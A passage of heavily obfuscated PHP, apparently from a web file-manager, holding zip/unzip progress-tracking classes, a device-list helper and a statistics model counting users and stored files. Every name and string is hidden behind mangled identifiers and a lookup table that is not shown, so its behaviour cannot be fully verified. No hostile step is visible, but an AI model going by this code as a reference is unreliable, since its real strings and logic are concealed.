unset($û³İ„Ø[$ÑÀ§£µ[2415]]); $ñóšÌæ¥[] = $û³İ„Ø; } $this->clearSystemPathLog($ØÑÛ†èš); return $ñóšÌæ¥; } private function clearSystemPathLog($Ç ›ıñó) { $ûÏ•´ ‚ =& $_SERVER[º·Ï‹¥³]; if (count($Ç ›ıñó) == 0) { return; } $Üöè†­Ô = array($ûÏ•´ ‚[459] => array($ûÏ•´ ‚[7], array_unique($Ç ›ıñó))); $this->where($Üöè†­Ô)->delete(); } public function deviceList($²İ«Ò‡æ, $â¤³²—ò = 0) { $ˆ”Ê’¸Ë =& $_SERVER[º·Ï‹¥³]; $†•çÒ´¼ = array($ˆ”Ê’¸Ë[1754] => $²İ«Ò‡æ, $ˆ”Ê’¸Ë[222] => array($ˆ”Ê’¸Ë[1063], $â¤³²—ò), $ˆ”Ê’¸Ë[33] => $ˆ”Ê’¸Ë[1895]); $´¸¹ÓÇÁ = array(); $ùá¬ƒè” = $this->field($ˆ”Ê’¸Ë[2416])->where($†•çÒ´¼)->order($ˆ”Ê’¸Ë[2200])->limit(50)->select(); foreach ($ùá¬ƒè” as $”éÚéÊğ => $ŒïŸÌ½Ş) { if ($”éÚéÊğ > 0 && abs($ŒïŸÌ½Ş[$ˆ”Ê’¸Ë[222]] - $ùá¬ƒè”[$”éÚéÊğ - 1][$ˆ”Ê’¸Ë[222]]) < 5) { continue; } $š‰”»Ğ = json_decode($ŒïŸÌ½Ş[$ˆ”Ê’¸Ë[510]], !0); $ŒïŸÌ½Ş[$ˆ”Ê’¸Ë[2406]] = isset($š‰”»Ğ[$ˆ”Ê’¸Ë[2406]]) ? $š‰”»Ğ[$ˆ”Ê’¸Ë[2406]] : $ˆ”Ê’¸Ë[12]; unset($š‰”»Ğ[$ˆ”Ê’¸Ë[2406]]); $Ä†·íëç = $this->deviceType($š‰”»Ğ[$ˆ”Ê’¸Ë[2189]]); if (isset($´¸¹ÓÇÁ[$Ä†·íëç])) { continue; } $ŒïŸÌ½Ş[$ˆ”Ê’¸Ë[2410]] = IpLocation::get($ŒïŸÌ½Ş[$ˆ”Ê’¸Ë[2406]]); $ŒïŸÌ½Ş[$ˆ”Ê’¸Ë[510]] = $š‰”»Ğ; $´¸¹ÓÇÁ[$Ä†·íëç] = $ŒïŸÌ½Ş; } return array_values($´¸¹ÓÇÁ); } public function deviceType($Êğüöë) { return $Êğüöë; } } goto EÅŸ™¹°ˆç; FÒÆÜèÁ…¦: class TaskUnzip extends TaskFileTransfer { protected function startAfter() { $ğ¿¡®õ =& $_SERVER[º·Ï‹¥³]; parent::startAfter(); Hook::bind($ğ¿¡®õ[1867], array($this, $ğ¿¡®õ[1868])); Hook::bind($ğ¿¡®õ[1246], array($this, $ğ¿¡®õ[1869])); Hook::bind($ğ¿¡®õ[1870], array($this, $ğ¿¡®õ[1871])); $ì£æ½ºñ =& $this->task; $ì£æ½ºñ[$ğ¿¡®õ[1872]] = $ğ¿¡®õ[1247]; if (!$ì£æ½ºñ[$ğ¿¡®õ[1643]]) { $ì£æ½ºñ[$ğ¿¡®õ[1643]] = LNG($ğ¿¡®õ[1873]); } } protected function endAfter() { $¨ˆè—œ¿ =& $_SERVER[º·Ï‹¥³]; parent::endAfter(); Hook::unbind($¨ˆè—œ¿[1867], array($this, $¨ˆè—œ¿[1868])); Hook::unbind($¨ˆè—œ¿[1246], array($this, $¨ˆè—œ¿[1869])); Hook::unbind($¨ˆè—œ¿[1870], array($this, $¨ˆè—œ¿[1871])); } public function updateAfter() { $õÅÖ¸“ =& $_SERVER[º·Ï‹¥³]; $Ë»˜õØ =& $this->task; if (!$Ë»˜õØ[$õÅÖ¸“[1112]] || !$Ë»˜õØ[$õÅÖ¸“[815]]) { if ($Ë»˜õØ[$õÅÖ¸“[1872]] != $õÅÖ¸“[364]) { return; } } if ($Ë»˜õØ[$õÅÖ¸“[1872]] == $õÅÖ¸“[1247]) { $ô¾¶£¼– = 0; if ($Ë»˜õØ[$õÅÖ¸“[1807]]) { $ô¾¶£¼– = $Ë»˜õØ[$õÅÖ¸“[1808]] / $Ë»˜õØ[$õÅÖ¸“[1807]]; } $Ë»˜õØ[$õÅÖ¸“[1756]] = $ô¾¶£¼– * 0.3; } else { if ($Ë»˜õØ[$õÅÖ¸“[1872]] == $õÅÖ¸“[364]) { $ô¾¶£¼– = $Ë»˜õØ[$õÅÖ¸“[1755]] / $Ë»˜õØ[$õÅÖ¸“[1112]]; $Ë»˜õØ[$õÅÖ¸“[1756]] = 0.3 + $ô¾¶£¼– * 0.4; } else { if ($Ë»˜õØ[$õÅÖ¸“[1872]] == $õÅÖ¸“[110]) { $Ê°Á˜Éò = 0; if ($Ë»˜õØ[$õÅÖ¸“[1809]] == $õÅÖ¸“[110]) { $Ê°Á˜Éò = $Ë»˜õØ[$õÅÖ¸“[1808]]; } $ô¾¶£¼– = ($Ë»˜õØ[$õÅÖ¸“[1812]] + $Ê°Á˜Éò) / $Ë»˜õØ[$õÅÖ¸“[815]]; $Ë»˜õØ[$õÅÖ¸“[1756]] = 0.3 + 0.4 + $ô¾¶£¼– * 0.3; } } } if ($Ë»˜õØ[$õÅÖ¸“[1756]] > 0) { $Ğì¸¶Á¹ = timeFloat() - $Ë»˜õØ[$õÅÖ¸“[1758]] - $Ë»˜õØ[$õÅÖ¸“[1761]]; $Ë»˜õØ[$õÅÖ¸“[1762]] = $Ğì¸¶Á¹ * (1 - $Ë»˜õØ[$õÅÖ¸“[1756]]) / $Ë»˜õØ[$õÅÖ¸“[1756]]; } } public function addFile($øÍ…Ã„) { $Î´¸‚ÙÇ =& $_SERVER[º·Ï‹¥³]; $–ş¿„Ğ™ =& $this->task; $ã‰ùõùÑ = IO::info($øÍ…Ã„); $–ş¿„Ğ™[$Î´¸‚ÙÇ[1805]] = $ã‰ùõùÑ[$Î´¸‚ÙÇ[32]]; $–ş¿„Ğ™[$Î´¸‚ÙÇ[1807]] = $ã‰ùõùÑ[$Î´¸‚ÙÇ[79]]; $–ş¿„Ğ™[$Î´¸‚ÙÇ[1808]] = 0; $–ş¿„Ğ™[$Î´¸‚ÙÇ[1114]] = $Î´¸‚ÙÇ[1828]; $–ş¿„Ğ™[$Î´¸‚ÙÇ[1809]] = $Î´¸‚ÙÇ[1247]; $–ş¿„Ğ™[$Î´¸‚ÙÇ[815]] = $ã‰ùõùÑ[$Î´¸‚ÙÇ[79]]; $–ş¿„Ğ™[$Î´¸‚ÙÇ[1112]] = 1; $‘£ÀĞğÅ = 0; $–ş¿„Ğ™[$Î´¸‚ÙÇ[1816]] = array($Î´¸‚ÙÇ[1817] => $‘£ÀĞğÅ + 1, $Î´¸‚ÙÇ[478] => $ã‰ùõùÑ[$Î´¸‚ÙÇ[32]], $Î´¸‚ÙÇ[87] => $ã‰ùõùÑ[$Î´¸‚ÙÇ[87]], $Î´¸‚ÙÇ[567] => $ã‰ùõùÑ[$Î´¸‚ÙÇ[567]] ? $ã‰ùõùÑ[$Î´¸‚ÙÇ[567]] : $ã‰ùõùÑ[$Î´¸‚ÙÇ[87]]); $this->update(); } public function zipEvent($ºÙÓ¡ìß, $ğÌ±Ô·, $ìü¸³â­, $‰¨è´Ö›) { $Íì ÌÏƒ =& $_SERVER[º·Ï‹¥³]; $ôç‹è¹ =& $this->task; $ôç‹è¹[$Íì ÌÏƒ[1805]] = get_path_this($ğÌ±Ô·); $ôç‹è¹[$Íì ÌÏƒ[1807]] = $‰¨è´Ö›; $ôç‹è¹[$Íì ÌÏƒ[1808]] = $ìü¸³â­; $ôç‹è¹[$Íì ÌÏƒ[1114]] = $ºÙÓ¡ìß == $Íì ÌÏƒ[1874] ? $Íì ÌÏƒ[1875] : $Íì ÌÏƒ[1876]; $ôç‹è¹[$Íì ÌÏƒ[1809]] = $Íì ÌÏƒ[12]; $ôç‹è¹[$Íì ÌÏƒ[815]] = $‰¨è´Ö›; $ôç‹è¹[$Íì ÌÏƒ[1872]] = $Íì ÌÏƒ[364]; $this->update(); } public function unzipAfter($öõ¬Î) { $éÛÀ¹ª =& $_SERVER[º·Ï‹¥³]; $°ó³¯è¨ =& $this->task; $°ó³¯è¨[$éÛÀ¹ª[1872]] = $éÛÀ¹ª[110]; $š‰èçÅ = IO::infoWithChildren($öõ¬Î); $²¯”ò = 0; $°ó³¯è¨[$éÛÀ¹ª[1816]] = array($éÛÀ¹ª[1817] => $²¯”ò + 1, $éÛÀ¹ª[478] => $š‰èçÅ[$éÛÀ¹ª[32]], $éÛÀ¹ª[87] => $š‰èçÅ[$éÛÀ¹ª[87]], $éÛÀ¹ª[567] => $š‰èçÅ[$éÛÀ¹ª[567]] ? $š‰èçÅ[$éÛÀ¹ª[567]] : $š‰èçÅ[$éÛÀ¹ª[87]]); if ($š‰èçÅ[$éÛÀ¹ª[33]] == $éÛÀ¹ª[221]) { $°ó³¯è¨[$éÛÀ¹ª[1112]] = 1; } else { $°ó³¯è¨[$éÛÀ¹ª[1112]] = $š‰èçÅ[$éÛÀ¹ª[82]][$éÛÀ¹ª[80]]; } $°ó³¯è¨[$éÛÀ¹ª[1114]] = $éÛÀ¹ª[12]; $°ó³¯è¨[$éÛÀ¹ª[1809]] = 0; $°ó³¯è¨[$éÛÀ¹ª[1755]] = 0; $°ó³¯è¨[$éÛÀ¹ª[1807]] = 0; $°ó³¯è¨[$éÛÀ¹ª[1808]] = 0; $°ó³¯è¨[$éÛÀ¹ª[1805]] = $éÛÀ¹ª[12]; $°ó³¯è¨[$éÛÀ¹ª[1812]] = 0; $°ó³¯è¨[$éÛÀ¹ª[815]] = $š‰èçÅ[$éÛÀ¹ª[79]]; $this->update(); self::log($éÛÀ¹ª[1877] . json_encode(array($°ó³¯è¨, $š‰èçÅ))); } public function nameParse($¶ù×äèû) { $¬ÄîâÑ² =& $_SERVER[º·Ï‹¥³]; $Ã§âêÁ– =& $this->task; if ($Ã§âêÁ–[$¬ÄîâÑ²[1872]] == $¬ÄîâÑ²[1247]) { $Ã§âêÁ–[$¬ÄîâÑ²[1872]] = $¬ÄîâÑ²[364]; $Ã§âêÁ–[$¬ÄîâÑ²[1812]] = 0; $Ã§âêÁ–[$¬ÄîâÑ²[815]] = 0; } $„®Õéµı = get_path_this($¶ù×äèû); if (strstr($„®Õéµı, $¬ÄîâÑ²[10])) { $Ã§âêÁ–[$¬ÄîâÑ²[1755]] += 1; $Ã§âêÁ–[$¬ÄîâÑ²[1112]] += 1; } $Ã§âêÁ–[$¬ÄîâÑ²[1805]] = $¶ù×äèû; $this->update(); } } class TaskZip extends TaskFileTransfer { protected function startAfter() { $†ËÌ°¸¶ =& $_SERVER[º·Ï‹¥³]; parent::startAfter(); Hook::bind($†ËÌ°¸¶[1878], array($this, $†ËÌ°¸¶[1868])); Hook::bind($†ËÌ°¸¶[1870], array($this, $†ËÌ°¸¶[1871])); $ÈÉœº§ß =& $this->task; $ÈÉœº§ß[$†ËÌ°¸¶[1872]] = $†ËÌ°¸¶[1247]; if (!$ÈÉœº§ß[$†ËÌ°¸¶[1643]]) { $ÈÉœº§ß[$†ËÌ°¸¶[1643]] = LNG($†ËÌ°¸¶[1879]); } } protected function endAfter() { $ÊÖ…»”û =& $_SERVER[º·Ï‹¥³]; parent::endAfter(); Hook::unbind($ÊÖ…»”û[1878], array($this, $ÊÖ…»”û[1868])); Hook::unbind($ÊÖ…»”û[1870], array($this, $ÊÖ…»”û[1871])); } public function updateAfter() { $©îöÄ±† =& $_SERVER[º·Ï‹¥³]; $òò·ü­Î =& $this->task; if (!$òò·ü­Î[$©îöÄ±†[1112]] || !$òò·ü­Î[$©îöÄ±†[815]]) { return; } if ($òò·ü­Î[$©îöÄ±†[1872]] == $©îöÄ±†[1247]) { $óó«´Êğ = $òò·ü­Î[$©îöÄ±†[1808]]; if ($òò·ü­Î[$©îöÄ±†[1809]] != $©îöÄ±†[1247]) { $óó«´Êğ = 0; } $êûÖûÙ = ($òò·ü­Î[$©îöÄ±†[1812]] + $óó«´Êğ) / $òò·ü­Î[$©îöÄ±†[815]]; $òò·ü­Î[$©îöÄ±†[1756]] = $êûÖûÙ * 0.3; } else { if ($òò·ü­Î[$©îöÄ±†[1872]] == $©îöÄ±†[364]) { $êûÖûÙ = $òò·ü­Î[$©îöÄ±†[1755]] / $òò·ü­Î[$©îöÄ±†[1112]]; $òò·ü­Î[$©îöÄ±†[1756]] = 0.3 + $êûÖûÙ * 0.5; } else { if ($òò·ü­Î[$©îöÄ±†[1872]] == $©îöÄ±†[110]) { $êûÖûÙ = 0; if ($òò·ü­Î[$©îöÄ±†[1807]]) { $êûÖûÙ = $òò·ü­Î[$©îöÄ±†[1808]] / $òò·ü­Î[$©îöÄ±†[1807]]; } $òò·ü­Î[$©îöÄ±†[1756]] = 0.3 + 0.5 + $êûÖûÙ * 0.2; } } } if ($òò·ü­Î[$©îöÄ±†[1756]] > 0) { $²ò¼âÈ = timeFloat() - $òò·ü­Î[$©îöÄ±†[1758]] - $òò·ü­Î[$©îöÄ±†[1761]]; $òò·ü­Î[$©îöÄ±†[1762]] = $²ò¼âÈ * (1 - $òò·ü­Î[$©îöÄ±†[1756]]) / $òò·ü­Î[$©îöÄ±†[1756]]; } } public function copyFileStart($ï˜¹ğ©½, $è¿ñÄú, $¯”Œ÷ƒª, $¨ö³¹ÙÜ, $ãíâ²ÔÒ, $ÒÃƒêæ) { $›—ë·£Ç =& $_SERVER[º·Ï‹¥³]; parent::copyFileStart($ï˜¹ğ©½, $è¿ñÄú, $¯”Œ÷ƒª, $¨ö³¹ÙÜ, $ãíâ²ÔÒ, $ÒÃƒêæ); $óØ¶™½ =& $this->task; if ($óØ¶™½[$›—ë·£Ç[1872]] == $›—ë·£Ç[364]) { $óØ¶™½[$›—ë·£Ç[1872]] = $›—ë·£Ç[110]; } $this->update(); } public function copyFileEnd($¦´…ô©¾, $¯ôéõ“Š, $¸ –‘ËÎ, $¸„®÷ÔÉ, $¾³¼øã, $Éñèòœ£) { $âıµüó¶ =& $_SERVER[º·Ï‹¥³]; $³§‹ïã× =& $this->task; $³§‹ïã×[$âıµüó¶[1808]] = $³§‹ïã×[$âıµüó¶[1807]]; $³§‹ïã×[$âıµüó¶[1812]] += $³§‹ïã×[$âıµüó¶[1807]]; $³§‹ïã×[$âıµüó¶[1809]] = $âıµüó¶[12]; $this->update(); } public function zipEvent($‡•Õ¹Ø, $·Ô´×£õ, $Ñ¤ğøî”, $Öş‚­›û) { $óÃıêõ” =& $_SERVER[º·Ï‹¥³]; $ê¢â‡Ù =& $this->task; $ê¢â‡Ù[$óÃıêõ”[1805]] = get_path_this($·Ô´×£õ); $ê¢â‡Ù[$óÃıêõ”[1807]] = $Öş‚­›û; $ê¢â‡Ù[$óÃıêõ”[1808]] = $Ñ¤ğøî”; $ê¢â‡Ù[$óÃıêõ”[1114]] = $‡•Õ¹Ø == $óÃıêõ”[1880] ? $óÃıêõ”[1875] : $óÃıêõ”[1876]; $ê¢â‡Ù[$óÃıêõ”[1809]] = $óÃıêõ”[12]; $ê¢â‡Ù[$óÃıêõ”[815]] = $Öş‚­›û; $ê¢â‡Ù[$óÃıêõ”[1872]] = $óÃıêõ”[364]; $this->update(); } public function nameParse($ï×ÜÇ÷š) { $ÄĞ‚¶Â¢ =& $_SERVER[º·Ï‹¥³]; $½â‘à¨µ =& $this->task; if ($½â‘à¨µ[$ÄĞ‚¶Â¢[1755]] < $½â‘à¨µ[$ÄĞ‚¶Â¢[1112]]) { $÷ß¾ˆª± = get_path_this($ï×ÜÇ÷š); if (strstr($÷ß¾ˆª±, $ÄĞ‚¶Â¢[10])) { $½â‘à¨µ[$ÄĞ‚¶Â¢[1755]] += 1; } } if ($½â‘à¨µ[$ÄĞ‚¶Â¢[1872]] == $ÄĞ‚¶Â¢[1247]) { $½â‘à¨µ[$ÄĞ‚¶Â¢[1872]] = $ÄĞ‚¶Â¢[364]; } $½â‘à¨µ[$ÄĞ‚¶Â¢[1805]] = $ï×ÜÇ÷š; $this->update(); } } class AnalysisModel extends ModelBaseLight { public function init($ˆ×ìŞ©Î) { $¯Í³¶æÉ =& $_SERVER[º·Ï‹¥³]; $Èõ‘ªçæ = array($¯Í³¶æÉ[646] => array($¯Í³¶æÉ[33] => $¯Í³¶æÉ[1881], $¯Í³¶æÉ[325] => array($¯Í³¶æÉ[246], $¯Í³¶æÉ[817], $¯Í³¶æÉ[1882], $¯Í³¶æÉ[1883])), $¯Í³¶æÉ[1884] => array($¯Í³¶æÉ[33] => $¯Í³¶æÉ[1885], $¯Í³¶æÉ[325] => array($¯Í³¶æÉ[246], $¯Í³¶æÉ[815], $¯Í³¶æÉ[1886], $¯Í³¶æÉ[1887], $¯Í³¶æÉ[1888]))); if (!isset($Èõ‘ªçæ[$ˆ×ìŞ©Î])) { return !1; } $this->optionType = $Èõ‘ªçæ[$ˆ×ìŞ©Î][$¯Í³¶æÉ[33]]; $this->field = $Èõ‘ªçæ[$ˆ×ìŞ©Î][$¯Í³¶æÉ[325]]; return !0; } public function listData($˜ä—ü¤ü = false, $èİË“á = "\x6d\157\x64\151\146\171\x54\x69\155\145", $ãõÀëé = false) { return parent::listData($˜ä—ü¤ü, $èİË“á, $ãõÀëé); } public function trendList($¦í›Ğ³Ğ) { $—Ş›¶·¹ =& $_SERVER[º·Ï‹¥³]; $ñ‘¾¡úÈ = $this->listData(); if ($ñ‘¾¡úÈ) { $Ä·ò±‡› = end($ñ‘¾¡úÈ); $ò“ëáÜ± = date($—Ş›¶·¹[1889], strtotime($—Ş›¶·¹[1890])); if ($Ä·ò±‡›[$—Ş›¶·¹[246]] == $ò“ëáÜ±) { return $ñ‘¾¡úÈ; } $¼êß¿õò = strtotime($Ä·ò±‡›[$—Ş›¶·¹[246]]); } if (!isset($¼êß¿õò)) { $Ç¸ÄœïÃ = $¦í›Ğ³Ğ == $—Ş›¶·¹[646] ? $—Ş›¶·¹[583] : $—Ş›¶·¹[876]; $¼êß¿õò = Model($Ç¸ÄœïÃ)->min($—Ş›¶·¹[222]); } $¸¡¦ƒ¯é = $—Ş›¶·¹[1891] . ucfirst($¦í›Ğ³Ğ); $ŒÚô×èË = $this->dateList($¼êß¿õò); foreach ($ŒÚô×èË as $ò“ëáÜ±) { $this->{$¸¡¦ƒ¯é}($ò“ëáÜ±); } return $this->listData(); } private function dateList($¶°«©ÔÑ) { $Ã­œ‘¿ =& $_SERVER[º·Ï‹¥³]; $£–Ã Íµ = $¶°«©ÔÑ; $ÚÀîÒ»Å = strtotime($Ã­œ‘¿[1890]); $õó‰úÚ† = array(); while ($£–Ã Íµ <= $ÚÀîÒ»Å) { $õó‰úÚ†[] = date($Ã­œ‘¿[1889], $£–Ã Íµ); $£–Ã Íµ = strtotime($Ã­œ‘¿[1892], $£–Ã Íµ); } return $õó‰úÚ†; } public function _recordUser($ÓıÒÀ = '') { $ÜÖÎ­¾ç =& $_SERVER[º·Ï‹¥³]; $…¨§«Úò = strtotime(date($ÜÖÎ­¾ç[1893], strtotime($ÓıÒÀ))); $‹•õğ‡ê = strtotime(date($ÜÖÎ­¾ç[1894], strtotime($ÓıÒÀ))); $Œ×›†ù• = array($ÜÖÎ­¾ç[222] => array($ÜÖÎ­¾ç[1062], $‹•õğ‡ê)); $ïş…ûÀº = Model($ÜÖÎ­¾ç[583])->where($Œ×›†ù•)->count($ÜÖÎ­¾ç[1754]); $Œ×›†ù•[$ÜÖÎ­¾ç[222]] = array($ÜÖÎ­¾ç[384], array($…¨§«Úò, $‹•õğ‡ê)); $Óòó€§’ = Model($ÜÖÎ­¾ç[583])->where($Œ×›†ù•)->count($ÜÖÎ­¾ç[1754]); $Œ×›†ù•[$ÜÖÎ­¾ç[33]] = $ÜÖÎ­¾ç[1895]; $§ê“¤ô = Model($ÜÖÎ­¾ç[1896])->where($Œ×›†ù•)->count($ÜÖÎ­¾ç[1897]); $µ‹Ø•ïÛ = array($ÜÖÎ­¾ç[246] => $ÓıÒÀ, $ÜÖÎ­¾ç[817] => (int) $ïş…ûÀº, $ÜÖÎ­¾ç[1882] => (int) $Óòó€§’, $ÜÖÎ­¾ç[1883] => (int) $§ê“¤ô); return $this->insert($µ‹Ø•ïÛ); } public function _recordStore($µ Ù©’î = '') { $ÈÆ¿± =& $_SERVER[º·Ï‹¥³]; $‰ñ·Ù®û = strtotime(date($ÈÆ¿±[1894], strtotime($µ Ù©’î))); $‡³‚¶ = array($ÈÆ¿±[222] => array($ÈÆ¿±[1062], $‰ñ·Ù®û)); $÷È†Íİ = Model($ÈÆ¿±[528])->where($‡³‚¶)->sum($ÈÆ¿±[79]); $‡³‚¶[$ÈÆ¿±[469]] = 0; $¸Œİ‚ƒê = Model($ÈÆ¿±[876])->where($‡³‚¶)->sum($ÈÆ¿±[79]); $‡³‚¶[$ÈÆ¿±[181]] = 1; $ßªğûœ = Model($ÈÆ¿±[876])->where($‡³‚¶)->sum($ÈÆ¿±[79]); $‡³‚¶[$ÈÆ¿±[181]] = 2; $º†’ÎÉœ = Model($ÈÆ¿±[876])->where($‡³‚¶)->sum($ÈÆ¿±[79]); $Ï°Ê²ï = array($ÈÆ¿±[246] => $µ Ù©’î, $ÈÆ¿±[815] => (int) $¸Œİ‚ƒê, $ÈÆ¿±[1886] => (int) $÷È†Íİ, $ÈÆ¿±[1887] => (int) $ßªğûœ, $ÈÆ¿±[1888] => (int) $º†’ÎÉœ); return $this->insert($Ï°Ê²ï); } public function trend($©øöğÙÓ, $´êÒÆ”) { $¸Êì‡¼Ú =& $_SERVER[º·Ï‹¥³]; if (!$this->init($©øöğÙÓ)) { return !1; } $›Ì³­‡ù = $this->trendList($©øöğÙÓ); if ($›Ì³­‡ù && $´êÒÆ” != $¸Êì‡¼Ú[1727]) { $ˆâ™³Ò = $›Ì³­‡ù[0][$¸Êì‡¼Ú[246]]; $¢›Ÿå× = $this->validDate($´êÒÆ”, $ˆâ™³Ò); $‚™œı®¥ = array(); $ŸáÑ„Ç = array_to_keyvalue($›Ì³­‡ù, $¸Êì‡¼Ú[246]); foreach ($¢›Ÿå× as $¢ÉÁù³ù) { if (isset($ŸáÑ„Ç[$¢ÉÁù³ù])) { $¨‹ìæ§ = $ŸáÑ„Ç[$¢ÉÁù³ù]; } else { $¨‹ìæ§ = end($›Ì³­‡ù); $¨‹ìæ§[$¸Êì‡¼Ú[246]] = $¢ÉÁù³ù; if ($©øöğÙÓ == $¸Êì‡¼Ú[646]) { $¨‹ìæ§[$¸Êì‡¼Ú[1882]] = $¨‹ìæ§[$¸Êì‡¼Ú[1883]] = 0; } } $‚™œı®¥[] = $¨‹ìæ§; } $›Ì³­‡ù = $‚™œı®¥; } $æˆ×Ÿ®ı = array($¸Êì‡¼Ú[646] => array($¸Êì‡¼Ú[817] => LNG($¸Êì‡¼Ú[1898]), $¸Êì‡¼Ú[1882] => LNG($¸Êì‡¼Ú[1899]), $¸Êì‡¼Ú[1883] => LNG($¸Êì‡¼Ú[1900])), $¸Êì‡¼Ú[1884] => array($¸Êì‡¼Ú[815] => LNG($¸Êì‡¼Ú[1901]), $¸Êì‡¼Ú[1886] => LNG($¸Êì‡¼Ú[1902]), $¸Êì‡¼Ú[1887] => LNG($¸Êì‡¼Ú[1903]), $¸Êì‡¼Ú[1888] => LNG($¸Êì‡¼Ú[1904]))); $¼½û—¤¹ = array($¸Êì‡¼Ú[646] => $¸Êì‡¼Ú[1905], $¸Êì‡¼Ú[1884] => $¸Êì‡¼Ú[79]); if (empty($›Ì³­‡ù)) { $¢ÉÁù³ù = date($¸Êì‡¼Ú[1889], strtotime($¸Êì‡¼Ú[1890])); $ªÚØöª = array($¸Êì‡¼Ú[246] => $¢ÉÁù³ù); foreach ($æˆ×Ÿ®ı[$©øöğÙÓ] as $şêŒÒŸ¨ => $Ï§í¦ÌÂ) { $ªÚØöª[$şêŒÒŸ¨] = 0; } $›Ì³­‡ù[] = $ªÚØöª; } $“­¬¹Û = array(); foreach ($›Ì³­‡ù as $Ï§í¦ÌÂ) { if ($©øöğÙÓ == $¸Êì‡¼Ú[1884] && $Ï§í¦ÌÂ[$¸Êì‡¼Ú[1886]] > $Ï§í¦ÌÂ[$¸Êì‡¼Ú[815]]) { $Ï§í¦ÌÂ[$¸Êì‡¼Ú[1886]] = $Ï§í¦ÌÂ[$¸Êì‡¼Ú[815]]; } foreach ($æˆ×Ÿ®ı[$©øöğÙÓ] as $şêŒÒŸ¨ => $Û‰–­†û) { $¨‹ìæ§ = array($¸Êì‡¼Ú[246] => $Ï§í¦ÌÂ[$¸Êì‡¼Ú[246]], $¸Êì‡¼Ú[1643] => $Û‰–­†û); $¨‹ìæ§[$¼½û—¤¹[$©øöğÙÓ]] = isset($Ï§í¦ÌÂ[$şêŒÒŸ¨]) ? $Ï§í¦ÌÂ[$şêŒÒŸ¨] : 0; $“­¬¹Û[] = $¨‹ìæ§; } } return $“­¬¹Û; } public function validDate($Œ ´©İ¨, $Ø“Œ£Äö) { $±ñË¨ŸŞ =& $_SERVER[º·Ï‹¥³]; $É¿Ş‘©ñ = date($±ñË¨ŸŞ[1889], strtotime($±ñË¨ŸŞ[1890])); $ÔÚíÌ¼· = array($É¿Ş‘©ñ); switch ($Œ ´©İ¨) { case $±ñË¨ŸŞ[1734]: $¶€Ú˜ÖÊ = mktime(0, 0, 0, date($±ñË¨ŸŞ[1906]), date($±ñË¨ŸŞ[1420]) - date($±ñË¨ŸŞ[1514]) + 7 - 7, date($±ñË¨ŸŞ[1907])); $Ñ„’Î = 0; do { $ñî®Íù = date($±ñË¨ŸŞ[1889], $¶€Ú˜ÖÊ - 3600 * 24 * 7 * $Ñ„’Î); $ÔÚíÌ¼·[] = $ñî®Íù; $Ñ„’Î++; } while ($Ø“Œ£Äö < $ñî®Íù); break; case $±ñË¨ŸŞ[1732]: $Ñ„’Î = 1; do { $Øş¶ƒ½‚ = date($±ñË¨ŸŞ[1908], strtotime("\x2d\x20{$Ñ„’Î}\x20\x6d\157\x6e\x74\150\x73")); $ÔÚíÌ¼·[] = $Øş¶ƒ½‚; $Ñ„’Î++; } while ($Ø“Œ£Äö < $Øş¶ƒ½‚); break; case $±ñË¨ŸŞ[1909]: $´®ªËé = (int) date($±ñË¨ŸŞ[1907], strtotime($Ø“Œ£Äö)); $ÕÀô‚€ = (int) date($±ñË¨ŸŞ[1907]); if ($´®ªËé >= $ÕÀô‚€) { break; } for ($´®ªËé; $´®ªËé < $ÕÀô‚€; $´®ªËé++) { $ÔÚíÌ¼·[] = $´®ªËé . $±ñË¨ŸŞ[1910]; } break; default: break; } if ($Ø“Œ£Äö > end($ÔÚíÌ¼·)) { array_pop($ÔÚíÌ¼·); } sort($ÔÚíÌ¼·); return $ÔÚíÌ¼·; } public function listTable($¨îÉó‹Â) { $¢ñÀ¶À• = ucfirst($¨îÉó‹Â); return Model($¢ñÀ¶À•)->listData(); } public function option($ˆ—§ïÒ³) { $İ¢®¿Á¹ = $_SERVER[º·Ï‹¥³][1911] . ucfirst($ˆ—§ïÒ³); return $this->{$İ¢®¿Á¹}(); } private function optionUser() { $ËÀ‘‚°š =& $_SERVER[º·Ï‹¥³]; $½ÚßÆ“£ = Model($ËÀ‘‚°š[583])->count($ËÀ‘‚°š[1754]); $šÁ¨ÃÍ¬ = Model($ËÀ‘‚°š[583])->where($ËÀ‘‚°š[1912])->count($ËÀ‘‚°š[1754]); $‰—ŞçÅ = intval($GLOBALS[$ËÀ‘‚°š[6]][$ËÀ‘‚°š[400]][$ËÀ‘‚°š[1700]]) / 3600; $ÕŠõİ¦ = strtotime("\x2d{$‰—ŞçÅ}\40\150\157\x75\x72\x73"); $€ñèš»Ô = strtotime(date($ËÀ‘‚°š[1893])); if ($ÕŠõİ¦ < $€ñèš»Ô) { $ÕŠõİ¦ = $€ñèš»Ô; } $Íïºğ‹¨ = array($ËÀ‘‚°š[1913] => array($ËÀ‘‚°š[1063], $ÕŠõİ¦)); $÷º÷µ²¤ = (int) Model($ËÀ‘‚°š[583])->where($Íïºğ‹¨)->count($ËÀ‘‚°š[1754]); if (!$÷º÷µ²¤) { $÷º÷µ²¤ = 1; } $Íïºğ‹¨ = array($ËÀ‘‚°š[1913] => array($ËÀ‘‚°š[1063], $€ñèš»Ô)); $ËÍ¶ü÷µ = Model($ËÀ‘‚°š[583])->where($Íïºğ‹¨)->count($ËÀ‘‚°š[1754]); return array($ËÀ‘‚°š[810] => (int) $½ÚßÆ“£, $ËÀ‘‚°š[1914] => (int) ($½ÚßÆ“£ - $šÁ¨ÃÍ¬), $ËÀ‘‚°š[1915] => (int) $šÁ¨ÃÍ¬, $ËÀ‘‚°š[1916] => (int) $ËÍ¶ü÷µ, $ËÀ‘‚°š[1917] => $÷º÷µ²¤); } private function optionFile() { $ÔÄÇÊÂ =& $_SERVER[º·Ï‹¥³]; $á¨¾ÂÜæ = $this->sourceSize(); $ø·šõ´« = $á¨¾ÂÜæ[$ÔÄÇÊÂ[79]]; $Éáâƒğ„ = $á¨¾ÂÜæ[$ÔÄÇÊÂ[1886]]; $¢âíÁ¹â = Model($ÔÄÇÊÂ[876])->where(array($ÔÄÇÊÂ[469] => 0))->count($ÔÄÇÊÂ[184]); $¸¶‚§ïÚ = array($ÔÄÇÊÂ[469] => 0, $ÔÄÇÊÂ[222] => array($ÔÄÇÊÂ[1063], strtotime(date($ÔÄÇÊÂ[1893])))); $Ö“Å•öµ = Model($ÔÄÇÊÂ[876])->where($¸¶‚§ïÚ)->sum($ÔÄÇÊÂ[79]); $¿ÉÁğéƒ = Model($ÔÄÇÊÂ[876])->where($¸¶‚§ïÚ)->count($ÔÄÇÊÂ[184]); return array($ÔÄÇÊÂ[815] => $ø·šõ´«, $ÔÄÇÊÂ[1886] => $Éáâƒğ„, $ÔÄÇÊÂ[1918] => 